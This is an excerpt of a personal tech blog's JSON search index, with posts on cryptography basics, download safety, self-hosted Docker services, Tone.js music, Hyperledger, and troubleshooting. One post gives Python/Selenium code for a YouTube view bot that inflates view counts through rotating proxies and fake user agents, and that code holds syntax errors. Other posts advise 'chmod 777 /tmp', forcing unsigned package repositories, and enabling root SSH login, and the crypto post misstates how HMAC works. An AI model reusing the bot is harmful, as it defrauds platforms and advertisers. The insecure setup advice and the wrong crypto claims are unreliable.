","tags":["hacker101"],"categories":["Hack"]},{"title":"密码学的一些概念","url":"/2018/12/11/[hack]-crypto-crash/","content":"\n## XOR\n异或运算的概念肯定大家已经熟悉了。我们知道，XOR运算两次的时候就会使其得到原来的值。这一个特点可以用于我们最为熟知加密运算。\n\n当然，这必然是一次性的 One-Time Pad\n\n## Types of Ciphers\n我们可以将加密主要分为两类：\n1. Symmetric -- 使用同样的key\n\n+ Stream 按照byte来加密\n\n常见的比如RC4，我们熟知的SSL，他使用随机数并XOR每一个byte来加密数据；解密也是只要XOR密文，这意味着这两个操作需要完全一致/identical\n\n根据这个定义，我们就可以构建一个简单的stream cipher，通过PRNG和seeding\n\n算法的强度仅仅依赖于随机的质量，毕竟都是伪随机; better quality of random output, stronger the encryption\n\n+ Block 按照block加密\n\nBlock Cipher 可能更加熟悉一些，AES（Rijndael），DES，3DES，TwoFish之类的\n\n在block cipher里，数据被分为N-byte个块，然后分开加密。同时我们也不知道数据是怎样被分割的，我们不得不填补它，增加了复杂度。同时，加密和解密不是相同的。\n\n也因为是通过block加密，许多的模式能够增加安全性，比如ECB Mode。\n\nElectronic CodeBook mode是最简单的block cipher。每一个明文block独立的加密为密文。这意味着相同的密文对应着相同的明文。\n\nCBC加密，Cipher Block Chaining同样很常见。每一个明文block在加密前使用XOR与前一个密文进行运算。这样避免了ECB模式的缺陷。因为每一个block存在于一个类似于链式结构的情况，于是可能导致一些有趣的bug。\n\n2. Asymmetric -- 使用private key\n\n对于非对称加密，最常见的就是RSA了，使用公钥和私钥。同时非对称加密也可以用于加密和签名。也有时候非对称加密没有直接用于加密是因为性能和复杂度的原因。\n\n## HASHES\nHashes也组成了加密的重要部分，一个常见的hash方法 128-512 MD5 SHA1、SHA256。\n\nhash对于单独的object加密十分有帮助，决定了数据的integrity。\n\n## MACs\nMessage Authentication Codes通常基于hashes，这就意味着对于给定的MAC，你们可以确保数据没有被干扰，同时验证MAC能没有被篡改。这是因为，你需要共享同样的key用来验证MAC，如果没有就不能创建一个有效的MAC\n\n\n## HMAC\n最著名的MAC就是HMAC，使用一个简单的结构：\nHMAC(key, message) = hash(key + hash(key + message))\n\nKey被各自的哈希算法填充，是十分最简单的一种了。","tags":["cryptography"],"categories":["Hack"]},{"title":"Be careful when we download stuff","url":"/2018/12/09/[hack]-be-careful-when-download/","content":"\nI want to share tip for keeping our device in safe with us. Whatever you use Mac or PC, even mobile device, anyone are exposed on the threat of attacker. So be careful whenever we download stuff on the Internet. \n\n### HTTPS\n\nAs we all know, `S` mean secure, is the secure version of HTTP, the protocol over wich data is sent between your browser and the website. Far more better than HTTP. \n\nSo we should, firstly, open the website whose address start with https. The download link provided on the main website should also be https. If the downlaod link is not https, there are at least two way to cause agent hijack attack. DNS hijack or Backdoor Factory. \n\n### File falsify test\n\nMost people forget this one, the website also tend to be ignore the file falsify test. It should provide MD5, or better SHA256. \n\nBut most of open source tool website offers original signature. We can use the GPG signature verifcation to make sure whether the file is falsified or not. \n\n```\ngpg --verify xxx.zip.sig yyy.zip\n```\n\n","tags":["security"],"categories":["Hack"]},{"title":"Using Chromedriver in linux","url":"/2018/04/21/Using-chromedrive-in-linux/","content":"\nA simple motivation for me to use chromedrive on my server. Someone ask me if I could make some fake youtube view on his channel. I said possible, but haven't tried before. \n\nSome blogs said it could use Tor browser to refresh the user trace. But the installation of Tor on linux brings me to hell. I know dark net is cool. But I just cannot figure it out how I can quickly achieve my simple goal.\n\nChromedirve may help me to fake a browser on linux. because I need some long duration view requests on linux.\n\nThen I came across some errors:\n```\n    APT-GET“Couldn’t create temporary file for passing config to apt-key”\n```\nor `cannot install unsigned` stuff ...\n\nUsing `--allow-unauthenticated` to force pass unsigned repo list, I hope it work but it just throw me different warning error. \n\nI'd tried add `[trusted=yes]` in the front of `source.list`. It fixed one of two stage error: bypass the key. But still cannot update apt. \n\nHow about `pacman/pacapt`. This time we cannot use this tool, though it still the top way of managing program in ubuntu. \n\nThen I checked the `/tmp` folder, if there is some error, some lost of premission stuff. To be honest, I have no idea since `/tmp` folder is a important system folder and I'd never ever touched it before. \n\nBut after add `chmod 777 /tmp`. It works out.\n\nWe still can use both add `deb` or just using `apt install` to install `google-chrome-stable`; simple command `sudo apt-get install google-chrome-stable`; if got problem or dependencies problem; use `sudo apt-get install -f` \n\nNotice that `-f` means `--fix-broken` not `--force`; actually you cannot install a program forcely. \n\nNext article I will write a tuturial about youtube view bot; a way to increase youtube fake view. But this way still depends on a nice proxy pool. Free proxy pool may not help. ","tags":["Linux"],"categories":["Tech"]},{"title":"Let your VPS be useful","url":"/2018/03/11/Let-your-VPS-be-useful/","content":"\nI'd tried a wide range of cloud vendor. Just because I feel little bit neat freak on my own machine. On the virtual machine, I don't worry about the overload, the wastage or the upgrade. That is the advantage of the VPS. When you want to add disk size due to the massive data, just few clicks can help you; or when you want to maintain some monitor some metrix on your machine, just keep it running and no need to focus the runtime of the physics device -- a wholesome cloud infrastructure will help you.\n\nHowever, most people just leave the machine unused, since the cloud vendor, after all, provided the most direct service for customer rather than left ourself to develop. But those service, more or less limiting the usage of single user, annoyed most of us. Why don't we just using the docker to build a own?\n\n## ownCloud\nFeel bad about the charging policy or limited size of the Google Drive or BaiduYunPan? It is undisputed for most public cloud drive markets that only subscribed can enjoy the tiny convenience of the cloud drive. \n\nHow about using ownCloud to build our own?\n\n    docker run -p 8081:80 -d imdjh/owncloud-with-ocdownloader\n\nJust one line code with docker can quickly build a private cloud drive.\n\n## MetaBase\nSince we got our cloud drive to storage our data, why don't we build a data analysis tool to handle our data on cloud?\n\n> Metabase is the easy, open source way for everyone in your company to ask questions and learn from data.\n\n    docker run -d -p 3000:3000 --name metabase metabase/metabase\n\n## minidlna\nWatching TV or PS4 all the day, or we can using the server turn into a mutil media center.\n\n    sudo apt-get install minidlna\n\nOnly if you TV supports dlna protocol\n\n## Cloud backup\nTime Capsule is good, build our own cloud backup using AFP protocol is also functional achievable. \n\n    sudo apt-get install netatalk avahi-daemon\n    sudo vim /etc/netatalk/AppleVolumes.default\n\nEdit some config file:\n\n    :DEFAULT: options:upriv,usedots\n    /home/exampleuser/tm \"TimeMachine\" options:tm exampleuser\n\n\n## Cloud Torrent\n\n```\nversion: '2'\n\nservices:\n  ct:\n    image: jpillora/cloud-torrent\n    volumes: \n      - /root/downloads:/downloads\n    restart: always\n    ports:\n      - 4300:63000\n    command: '--port 63000'\n```\n\n\n## netdata\n\n```\nversion: '3'\n\nservices:\n  netdata:\n    image: netdata/netdata\n    volumes: \n      - /proc:/host/proc:ro\n      - /sys:/host/sys:ro\n      - /var/run/docker.sock:/var/run/docker.sock:ro\n    restart: always\n    cap_add:\n      - SYS_PTRACE\n    security_opt:\n      - apparmor=unconfined\n    ports:\n      - 19999:19999\n\n```","tags":["Linux"],"categories":["Tech"]},{"title":"Make a youtube viewer bot","url":"/2018/03/02/Make-a-youtube-viewer-bot/","content":"\n\nWell I think I should show my code first, then talk about the method. \n\n```\nimport os\nimport re\nimport requests\nfrom os import _exit\nfrom time import sleep\nfrom random import choice,uniform\nfrom threading import Thread\nfrom argparse import ArgumentParser\nfrom selenium import webdriver\nfrom selenium.webdriver.common.proxy import Proxy,ProxyType\nfrom fake_useragent import UserAgent\nfrom os import path\nosproxy = \"http://127.0.0.1:8888\"\nsysProxy = False\ntest = False\nproxy_pool_url = 'http://ip.jiangxianli.com'\n# os.environ['http_proxy'] = osproxy \n# os.environ['HTTP_PROXY'] = osproxy\n# os.environ['https_proxy'] = osproxy\n# os.environ['HTTPS_PROXY'] = osproxy\n\ndef load_arg():\n    args = {}\n    args[\"url\"] = \"https://youtu.be/0eG76YapPPE\"\n    args[\"threads\"] = 10\n    args[\"duration\"] = 5\n    args[\"proxies\"] = None\n    return args\n\n\ndef test_proxy(osproxy):\n    print(osproxy)\n    os.environ['http_proxy'] = osproxy \n    os.environ['HTTP_PROXY'] = osproxy\n    os.environ['https_proxy'] = osproxy\n    os.environ['HTTPS_PROXY'] = osproxy\n    result = requests.get(\"http://www.baidu.com\")\n    print(result)\n    \ndef load_proxy():\n    if args[\"proxies\"] is not None:\n        proxies=open(args[\"proxies\"],'r').read().split('\\n')\n    else:\n        proxies=re.findall(re.compile('<td>([\\d.]+)</td>'),str(requests.get(proxy_pool_url).content))\n        proxies=['%s:%s'%x for x in list(zip(proxies[1::3],proxies[2::3]))]\n        \n    print('%d proxies successfully loaded!'%len(proxies))\n    p=Proxy()\n    p.proxy_type=ProxyType.MANUAL\n    return p, proxies\n\ndef bot_config(url):\n    proxy, proxies = load_proxy()\n    if sysProxy:\n        proxy.http_proxy = osproxy\n    else: \n        proxy.http_proxy=choice(proxies)\n        \n    proxy.autodetect = False\n    proxy.ssl_proxy=proxy.http_proxy\n    print(proxy.http_proxy)\n    chrome_options=webdriver.ChromeOptions()\n    chrome_options.add_argument('--mute-audio')\n    chrome_options.add_argument('--no-sandbox')\n    chrome_options.add_argument('ignore-certificate-errors')\n    chrome_options.add_argument('----headless')\n    chrome_options.add_argument('--no-startup-window')\n    chrome_options.add_argument('user-agent=\"{}\"'.format(agent.random))\n    chrome_options.add_argument(\"--proxy-server=http://{}\".format(proxy.http_proxy))\n    print(chrome_options.arguments)\n    print(\"loaded add_argument\")\n    capabilities=webdriver.DesiredCapabilities.CHROME\n    proxy.add_to_capabilities(capabilities)\n    print(\"loaded capabilities\")\n    chrome_options.binary_location = \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\"\n    chrome_driver_binary = \"./chromedriver.exe\"\n    driver=webdriver.Chrome(executable_path = chrome_driver_binary,  options=chrome_options,desired_capabilities=capabilities)\n    print(\"loaded driver\")\n    print(driver.get(args[\"url\"]))\n    print(\"sleeping\",args[\"duration\"])\n    sleep(args[\"duration\"])\n    driver.close()\n    print(\"driver closed\")\n    \ndef bot(url):\n    try:\n        while True:\n            bot_config(url)\n    except Exception as e:\n        print(e)\n        _exit(0)\n    \ndef Ebot(url):\n    while True:\n        bot_config(url)\n        \n\n\ndef main():\n    args = load_arg()\n    agent=UserAgent()\n    for i in range(args[\"threads\"]):\n        t=Thread(target=Ebot,args=(args[\"url\"],))\n        t.deamon=True\n        t.start()\n        sleep(uniform(1.5,3.0))\n    \nif __name__ = \"__main__\":\n    if test:                \n        args = load_arg()\n        proxy, proxies = load_proxy() \n        test_proxy(choice(proxies))\n    else:\n        main()\n```","tags":["Linux"],"categories":["Tech"]},{"title":"Using Tone.js to make 8 bit music","url":"/2018/03/01/Using-Tone-js-to-make-8bit-music/","content":"\n## What is 8 bit music\n8 bit music is also called chip music.\n\nAt that time, only small memory can be installed in game console （e.g. FC). Producer cannot make high sampling-rate PCM music. But music is necessary when we play games. One solution is making music real time, which the played music can quickly clean the used memory and rebuild the next note. \n\nWhen making 8 bit music, we should storage the basic sound into the device priority. In the game music, we also needs to upload our music code (like the score) into the program. In this way we can make a game music, which become more popular in nowdays and gradually forming a new style on electricity music genre.\n\n## How to make 8 bit mudic\n\nWe use FC (Family Computer) as an example to explain 8 bit music. In the music system of FC, instrument is not exist. It only provided different waves to producer. When composing, people needs to transform different waves into different audio effect.\n\n5 tracks in FC:\n\n1. square wave (2 track)\n\n![square wave](https://i.loli.net/2019/02/12/5c62ce1f5dc96.jpg)\n\nSquare wave occupy two track, since it has variable proportions waves. Thus the wave generate different tone. Piano, guitar and other instrument can be simulated by this wave.  \n\n2. triangular wave (1 track)\n\n![triangular wave](https://i.loli.net/2019/02/12/5c62ce1f6c3b1.jpg)\n\nsometime we use this wave to simulate bass\n\n3. noise (1 track)\n\nNoise is the most common audio effect in games. We use noise to create the environment sound, like explode, footstep, crash and the rhythmic tapping.\n\n4. Sampling (1 track)\n\nSampling track is more complex than other. We don't need to dig it all up. \n\n#### Note: How to modify a note\n\nUsually, we use volumn, trill or envelope (ADSR) to polish the sound. \n\n## Web Audio\n\nHere is a [website](https://codepen.io/anon/embed/LxJEaj?slug-hash=LxJEaj&default-tab=result&height=300&theme-id=0&embed-version=2&user=anon) to exhibit web audio: \n\nHowever, you may notice that FC didn't provide sin wave. Because sin/cos wave is published after the game console. It is more soft than normal FC sound. \n\nTone.js is open source web audio SDK for developer make music using JS. We choose Tong.js because:\n\n+ Tone.js accepted we edit pitch rather than ask us play 440Hz sound. For example, it packaged the scale into the library, we don't need to play a sound which exactly is 440Hz.\n+ It packaged Attack and Release in ADSR (Attack, Decay, Sustain, Release). More convenience to develop \n\n## Steps\n\n1. Essential functon in Tone.js for sounding.\n\n    .triggerAttackRelease()\n\nIt including four parameter: note, duration, time and velocity.\n\nTime is related to duration which represent the position of the note in a song; velocity is a detail change, sometime 8 bit music left this parameter unchanged.\n\nThe code below is a example to show how we use these four parameter to make music.\n\n    var synth = new Tone.Synth().toMaster()\n    synth.triggerAttackRelease('C4', '4n', '8n', 1)\n    synth.triggerAttackRelease('E4', '8n', '4n + 8n', 1)\n\nIn this snippets, C4 and E4 represent the frequent of the sound. Time is accumulate and velocity is fixed. \n\nHow about we use code to write one bar?\n\n    var synth = new Tone.Synth().toMaster()\n    Tone.Transport.bpm.value = 120\n\n    synth.triggerAttackRelease('E4', '4n', '0', 1)\n    synth.triggerAttackRelease('E4', '4n', '4n', 1)\n    synth.triggerAttackRelease('F4', '4n', '2n', 1)\n    synth.triggerAttackRelease('G4', '4n', '2n+4n', 1)\n\n2. Using harmony\n\nWhat is the harmony? It is two or more sound play together, following some rules. We can use different note at the same time to composite a new harmony. \n\nAfter finished the single track editing, we need to add more instruments.\n\n    var triangleOptions = {\n    oscillator: {\n        type: 'triangle'\n    }\n    }\n\n    var squareOptions = {\n    oscillator: {\n        type: 'square'\n    }\n    }\n\n    var squareSynth = new Tone.Synth(squareOptions).toMaster()\n\n    var triangleSynth = new Tone.Synth(triangleOptions).toMaster()\n\n    var noiseSynth = new Tone.NoiseSynth().toMaster()\n\nEach tone has different wave, which represent different instruments. `squareSynth` is used to play main melody instruments, such as piano, guitar. `trangleSynth` is used to simulate bass. `noiseSynth` is used to smulate percussion music。\n\n3. Audio effect\n\nLast step we should add audio effect to make music more rich. Like I mentioned before, ADSR can create some reverberation, echo and differnet pitch. These can be achieved by `Tone.Envelope()`.\n\n![ADSR](https://i.loli.net/2019/02/12/5c62ce1f5dc96.jpg)\n\nHere is the code:\n\n    envelope: {\n    attack  : 0.01 ,\n    decay  : 0.1 ,\n    sustain  : 0.5 ,\n    release  : 1 ,\n    attackCurve  : linear ,\n    releaseCurve  : exponential\n    }\n\n## Consolution\nPretty easy aha, I think the next generation of music must be computer music. ","tags":["music"],"categories":["Tech"]},{"title":"Different between 5 Hyperleder project","url":"/2018/02/10/hyperledger-project/","content":"The Linux Foundation’s Hyperledger project, which is focused on open source blockchain technology, divides its work into five sub projects. Hyperledger Executive Director Brian Behlendorf said Hyperledger’s technical steering committee must approve each new sub project, and it’s looking for projects that “represent different thinking.”\n\nThe first five projects are: Fabric, Sawtooth, Indy, Burrow, and Iroha.\n\n“Every one of these projects started life outside of Hyperledger, first, by a team that had certain use cases in mind,” said Behlendorf. Each project must bring something unique to the open source group, and its technology must be applicable to other companies.\n\n### Fabric\nFabric is Hyperledger’s most active project to date. The Fabric 1.0 release was issued in July. IBM initiated the Fabric project. It’s intended as a foundation for developing blockchain distributed ledger applications with a modular architecture. It allows components, such as consensus and membership services, to be plug-and-play.\n\n“Fabric is the granddaddy, if you will,” said Behlendorf. “Several companies are already selling products and services based on it.” The core of the platform is written in the Go programming language. A unique characteristic of Fabric is that its distributed ledger and smart contract platform allows for private channels. “If you have a large blockchain network and you want to share data with only certain parties, you can create a private channel with just those participants,” Behlendorf said. “It’s the most distinctive thing about Fabric right now.”\n\n### Sawtooth\nThe Sawtooth project originally came from Intel. It includes a novel consensus algorithm called Proof of Elapsed Time. Consensus is a critical element of all blockchains. Generally, it is the technique by which new information is reviewed and confirmed before being accepted as the next entry in the ledger.\n\nThe Sawtooth consensus software targets large distributed validator populations with minimal resource consumption. “It may give us the ability to build very broad and flat networks of hundreds to thousands of nodes,” said Behlendorf. “It’s harder to do with traditional consensus mechanisms without having the CPU burden of cryptocurrencies.”\n\n### Indy\nThe Indy project was originally the brainchild of the nonprofit group the Sovrin Foundation. The idea is to provide digital identities for individuals and give them the power to share their identity with whom they chose. “Instead of being an entry in a giant data base, you have your data and deal programmatically with different organizations who want to check your identity,” said Behlendorf. “And companies don’t have to store so much personal data. They can store a pointer to the identity.”\n\nIndy’s work looks especially timely, given the recent Experian hack. Behlendorf said Indy’s blockchain software is based on data minimization. When a company is done with your data, it throws it away. “It’s a toxic asset that could present a liability,” he said.\n\n### Burrow\nThe Burrow project includes a permissioned, smart-contract interpreter built in part to the specification of the Ethereum Virtual Machine (EVM). The Ethereum platform is used both for cryptocurrency as well as for smart contracts. It’s written with the Solidity programming language. Within the Burrow Project, the EVM is the interpreter for smart contracts (not related to cryptocurrency) that run across the Ethereum network.\n\nMany well-known companies belong to the Enterprise Ethereum Alliance, including JPMorgan, Microsoft, Accenture, BP, and Cisco.\n\n“It’s important to build a relationship with the Ethereum community,” said Behlendorf. “Burrow is the only Apache-licensed Ethereum VM implementation out there.”\n\n### Iroha\nFinally, the Iroha project is a bit of an outlier within Hyperledger. It originated with some developers in Japan who had built their own blockchain technology for a couple of mobile use cases. “It’s implemented in C++ which can be more high performance for small data and focused use cases,” said Behlendorf. “Iroha is still looking for its niche, but it’s a great development team.”","tags":["Hyperledger"],"categories":["Tech"]},{"title":"Programming language for Distribute System","url":"/2018/02/09/programming-language-for-distributed-system/","content":"## 1. Erlang\n[Erlang][1], as described by [Wikipedia][2]:\n\n> It was designed by Ericsson to support distributed, fault-tolerant, soft-real-time, non-stop applications.\n\nYou might also want to read the [*Distributed Erlang*][3] section of their manual.\n\nHowever, note that Erlang is a [*functional* language][4] and will require a much different paradigm of thought as compared to C++.\n\n> A distributed Erlang system consists of a number of Erlang runtime systems communicating with each other. Each such runtime system is called a node. Message passing between processes at different nodes, as well as links and monitors, are transparent when pids are used. Registered names, however, are local to each node. This means that the node must be specified as well when sending messages, and so on, using registered names.\n\n\n\n\n\n\n## 2. Golang\nGoLang from Google is a pretty new language. It seems that among its many attributes, it may some day be suitable for large distributed systems requiring a lot of message queues to achieve scalable consistent and reliable behaviours, at least according to [these folks][5] at heroku.\n\nGo seems to be focused on concurrency issues, threading primitives in the language, and so on, and this is perhaps a necessary-but-not-quite-sufficient starting point for distributed systems. Perhaps their thoughts will be helpful to you. I wouldn't call Go-lang's support for distributed systems \"first-class\", but rather, say that it would be possible to build a first class distributed-systems framework using Go's library and language primitives.\n\nAt first, I'm less impressed with Go. I think it suffers from some sad and limited thinking on the part of its authors. I think its decisions on fault and exception handling are retrograde, and render the language unusable.\n\nBut I now think in terms of large team development where having N-factorial implementation options leads to N-factorial different coding tarpits. At least Go doesn't seem to have labrea scale tarpits, only certain conventional mudwallows. They absolutely love tabs and will insert them into your code for you if you fail to love them enough.\n\n## 3. Bloom\n[Bloom][6] is a new domain-specific language for distributed programming. The current alpha release is embedded in Ruby, and targeted at early adopters. Bloom leverages new research on \"CALM\" analysis to provide tools that pinpoint distributed consistency and coordination issues in your code.\n\n## 4. Python\n[Parallel Python][7] is a python module which provides mechanism for parallel execution of python code on SMP (systems with multiple processors or cores) and clusters (computers connected via network):\n\n**Features:** \n\n * Parallel execution of python code on SMP and clusters \n * Easy to understand and implement job-based parallelization technique (easy to convert serial application in parallel)\n * Automatic detection of the optimal configuration (by default the number of worker processes is set to the number of effective processors)\n * Dynamic processors allocation (number of worker processes can be changed at runtime)\n * Low overhead for subsequent jobs with the same function (transparent caching is implemented to decrease the overhead)\n * Dynamic load balancing (jobs are distributed between processors at runtime)\n * Fault-tolerance (if one of the nodes fails tasks are rescheduled on others)\n * Auto-discovery of computational resources\n * Dynamic allocation of computational resources (consequence of auto-discovery and fault-tolerance) \n * SHA based authentication for network connections\n * Cross-platform portability and interoperability (Windows, Linux, Unix, Mac OS X)\n * Cross-architecture portability and interoperability (x86, x86-64, etc.)\n * Open source\n\nOne can get a quick idea of how the code might look by [looking at the quick-start guide for clusters][8].\n\n## 5. Reia\n[Reia][9] is a scripting language for distributed system:\n\n> Reia aims to expose the powerful\n> capabilities of Erlang in a way which\n> is easier for your average programmer\n> to understand. It aims to bring the\n> beauty and simplicity of Ruby, a\n> language which is easy and fun to\n> program in, to Erlang, a language\n> which very few will think of as easy\n> or fun to use.\n\n\n\n  [1]: http://www.erlang.org/\n  [2]: http://en.wikipedia.org/wiki/Erlang_%28programming_language%29\n  [3]: http://www.erlang.org/doc/reference_manual/distributed.html\n  [4]: http://en.wikipedia.org/wiki/Functional_programming\n  [5]: http://blog.golang.org/2011/04/go-at-heroku.html\n  [6]: http://bloom-lang.net/\n  [7]: http://www.parallelpython.com/\n  [8]: http://www.parallelpython.com/content/view/15/30/#QUICKCLUSTERS\n  [9]: http://reia-lang.org/","tags":["distributed System"],"categories":["Tech"]},{"title":"Troubleshooting mixed","url":"/2018/01/01/Troubleshooting/","content":"\nRecording some troubleshooting\n\n# Docker \nSome tips or little usage of docker \n\n1. how to shrink the docker logs\n    - `truncate -s 0 /var/lib/docker/containers/*/*-json.log` \n    - Though it works, but it still looks so terrible when your produced too many\n\n2. shadowsocks docker-compose:\n\n\n```\n---\nversion: \"3\"\n\nservices:\n\n  aes-256-cfb_ss:\n    image: mritd/shadowsocks\n    ports:\n      - 2333:8989\n    restart: always\n    command: -m \"ss-server\" -s \"-s 0.0.0.0 -p 8989 -m aes-256-cfb -k mypassword--fast-open\"\n```\n\n# netdata\n\nHere is the docker-compose file:\n\n```\nversion: '3'\n\nservices:\n  netdata:\n    image: netdata/netdata\n    volumes: \n      - /proc:/host/proc:ro\n      - /sys:/host/sys:ro\n      - /var/run/docker.sock:/var/run/docker.sock:ro\n    restart: always\n    cap_add:\n      - SYS_PTRACE\n    security_opt:\n      - apparmor=unconfined\n    ports:\n      - 19999:19999\n\n```\n\n# Python snippets\n\n反转字符串：\n```\ndef main(word):\n    return ' '.join(word.split()[::-1])\nword = 'the sky is blue'\ninverse = main(word)\nprint(word)\nprint(inverse)\n```\n\n编辑距离\n```\nimport re\nfrom collections import Counter\n\nf = open(r'word_freq.txt', encoding='utf8')\nWORDS = {}\nid = 0\nfor line in f.readlines():\n    if id % 2 == 0:\n        word_freq = line.split('\\t')\n        WORDS[word_freq[0]] = int(word_freq[1])\n    id = id + 1\nletters = open(r'word.txt', encoding='utf8').read()\n\nN = sum(WORDS.values())\n\ndef P(word):\n    return WORDS[word] / N\n\ndef know(words):\n    return set(w for w in words if w in WORDS)\n\ndef edits1(word):\n    #letters = 'abcdefghijklmnopqrstuvwxyz'\n    splits = [(word[:i], word[i:]) for i in range(len(word) + 1)] #切分\n    deletes = [L + R[1:] for L, R in splits if R] #删除\n    transposes = [L + R[1] + R[0] + R[2:] for L, R in splits if len(R) > 1] #移位\n    replaces = [L + c + R[1:] for L, R in splits for c in letters] #代替\n    inserts = [L + c + R for L, R in splits for c in letters] #插入\n    return set(deletes + transposes + replaces + inserts)\n\ndef edits2(word):\n    return (e2 for e1 in edits1(word) for e2 in edits1(e1))\n\ndef candidates(word):\n    return (know([word]) or know(edits1(word)) or know(edits2(word)) or [word])\n\ndef correction(word):\n    return max(candidates(word), key=P)\n\nprint(correction('正分夺秒'))\n```\n\nLoad json file and write it for utf-8 format:\n\n```\nimport os\nimport json\nimport codecs\n\ndef write_json(output):\n    with codecs.open(\"config.json\", \"w\", 'utf-8') as file:\n        # using utf-8 and ensure_ascii for keep the formatting correct\n        file.write(json.dumps(output, ensure_ascii=False))\n\n\ndef load_json():\n    with open(\"template.json\") as file:\n        template = json.load(file)\n        output = template\n        write_json(output)\n```\n\n\nMerge dictionary:\n\n1. Using the method update()\nBy using the method update() in Python, one list can be merged into another. But in this, the second list is merged into the first list and no new list is created. It returns None.\nExample:\nPython code to merge dict using update() method\n\n```\ndef Merge(dict1, dict2):\n    return(dict2.update(dict1))\n\n\n# Driver code\ndict1 = {'a': 10, 'b': 8}\ndict2 = {'d': 6, 'c': 4}\n\n# This return None\nprint(Merge(dict1, dict2))\n\n# changes made in dict2\nprint(dict2)\n```\n\n2. Using ** in Python\n\nThis is generally considered a trick in Python where a single expression is used to merge two dictionaries and stored in a third dictionary. The single expression is **. This does not affect the other two dictionaries. ** implies that the argument is a dictionary. Using ** [double star] is a shortcut that allows you to pass multiple arguments to a function directly using a dictionary. For more information refer ** kwargs in Python. Using this we first pass all the elements of the first dictionary into the third one and then pass the second dictionary into the third. This will replace the duplicate keys of the first dictionary.\nExample:\nPython code to merge dict using a single\n\n```\ndef Merge(dict1, dict2):\n    res = {**dict1, **dict2}\n    return res\n\n\n# Driver code\ndict1 = {'a': 10, 'b': 8}\ndict2 = {'d': 6, 'c': 4}\ndict3 = Merge(dict1, dict2)\nprint(dict3)\n```\n### Use argparse.\n\nFor example, with test.py:\n```\nimport argparse\n\nparser=argparse.ArgumentParser(\n    description='''My Description. And what a lovely description it is. ''',\n    epilog=\"\"\"All's well that ends well.\"\"\")\nparser.add_argument('--foo', type=int, default=42, help='FOO!')\nparser.add_argument('bar', nargs='*', default=[1, 2, 3], help='BAR!')\nargs=parser.parse_args()\n```\nRunning\n\n`% test.py -h`\nyields\n```\nusage: test.py [-h] [--foo FOO] [bar [bar ...]]\n\nMy Description. And what a lovely description it is.\n\npositional arguments:\n  bar         BAR!\n\noptional arguments:\n  -h, --help  show this help message and exit\n  --foo FOO   FOO!\n\nAll's well that ends well.\n```\n\n# Linux\n\n## What is sudo\n\nTo explain this you need to know what the programs do:\n\n`su` - The command `su` is used to switch to another user (**s** witch **u** ser), but you can also switch to the root user by invoking the command with no parameter. `su` asks you for the password of the user to switch, after typing the password you switched to the user's environment.     \n\n`sudo` - `sudo` is meant to run a single command with root privileges. But unlike `su` it prompts you for the password of the current user. This user must be in the sudoers file (or a group that is in the sudoers file). By default, Ubuntu \"remembers\" your password for 15 minutes, so that you don't have to type your password every time.\n\n`bash` - A text-interface to interact with the computer. It's important to understand the difference between login, non-login, interactive and non-interactive shells:\n\n- login shell: A login shell logs you into the system as a specified user, necessary for this is a username and password. When you hit <kbd>ctrl</kbd>+<kbd>alt</kbd>+<kbd>F1</kbd> to login into a virtual terminal you get after successful login a login shell.\n- non-login shell: A shell that is executed without logging in, necessary for this is a currently logged-in user. When you open a graphic terminal in gnome it is a non-login shell.\n- interactive shell: A shell (login or non-login) where you can interactively type or interrupt commands. For example a gnome terminal.\n- non-interactive shell: A (sub)shell that is probably run from an automated process. You will see neither input nor output.\n\n\n**`sudo su`** Calls `sudo` with the command `su`. Bash is called as interactive non-login shell. So bash only executes `.bashrc`. You can see that after switching to root you are still in the same directory:\n\n    user@host:~$ sudo su\n    root@host:/home/user#\n\n**`sudo su -`** This time it is a login shell, so `/etc/profile`, `.profile` and `.bashrc` are executed and you will find yourself in root's home directory with root's environment.\n\n**`sudo -i`** It is nearly the same as `sudo su -` The -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell.  This means that login-specific resource files such as `.profile`, `.bashrc` or `.login` will be read and executed by the shell.\n\n**`sudo /bin/bash`** This means that you call `sudo` with the command `/bin/bash`. `/bin/bash` is started as non-login shell so all the dot-files are not executed, but bash itself reads `.bashrc` of the calling user. Your environment stays the same. Your home will not be root's home. So you are root, but in the environment of the calling user.\n\n**`sudo -s`** reads the `$SHELL` variable and executes the content. If `$SHELL` contains `/bin/bash` it invokes `sudo /bin/bash` (see above).\n\n\n**Check:**\nTo check if you are in a login shell or not (works only in bash because `shopt` is a builtin command):\n\n    shopt -q login_shell && echo 'Login shell' || echo 'No login shell'\n\n\n\n### Referencing \n- https://askubuntu.com/questions/376199/sudo-su-vs-sudo-i-vs-sudo-bin-bash-when-does-it-matter-which-is-used\n\n### To enable root login in ubuntu: \n\nset `/etc/ssh/sshd_config`:\n```\nPermitRootLogin yes\n```\n\n# Jupyter notebook\n\n[Official Guild](https://jupyter-notebook.readthedocs.io/en/stable/public_server.html)\n\n[Running as a daemon](https://stackoverflow.com/questions/14297741/how-to-start-ipython-notebook-server-at-boot-as-daemon)\n\nIf you are using Anaconda integrated jupyter-notebook, using `which jupyter-notebook` to find the place that jupyter located.\n\nThen add this to `/usr/lib/systemd/system/jupyter.service`\n\n```\n[Unit]\nDescription=Jupyter Notebook\n\n[Service]\nType=simple\nPIDFile=/run/jupyter.pid\nExecStart=/root/anaconda3/bin/jupyter-notebook --config=/root/.jupyter/jupyter_notebook_config.py --allow-root\nUser=jupyter\nGroup=jupyter\nWorkingDirectory=/root\nRestart=always\nRestartSec=10\n#KillMode=mixed\n\n[Install]\nWantedBy=multi-user.target\n```\n\nSometimes it will faild by the Permission or config issues, using the following method to solve it.\n\n- add `--allow-root` in the end of the ExecStart command\n- remove `User` or `Group` on `[Service]` Option\n- add `/bin/bash -c ` in the head of the ExecStart\n\n\n# Windows\n\nWhen I transfer my development environment from OSX to Windows, due to the stipulation, I stuffered a lot because of the notorious unfriendly dev-env of windows.\n1. Unable to create any file or folder. Even though I reset the Security on the Properties on the Disk to full control. \n    - Finally I figured out some sorfware or my slip to create redgit lose. \n    - use win + R to open regdit\n    - Go into `HKEY_CLASSES_ROOT\\Directory\\Background\\shellex\\ContextMenuHandlers\\`\n    - Later I will find there only two option in the Context Menu Handlers. That's werid.\n    - If New folder exists, edits the New option and modify the Value to `{D969A300-E7FF-11d0-A93B-00A0C90F2719}`\n    - If it not exists, create one and fill the Value as I mentioned above.\n    \n\n# Node.js\n1. Though there are planty of method to deal with the callback machinism, still too many people, especially who have been learning static type language with no rudimentary of asynchronous programming experience, cannot be capable of adapting subversion coding style.\n2. So I am about to record some trouble when I learning node.js or typescripts or other javascripts-like stuff as a `story`.\n3. When 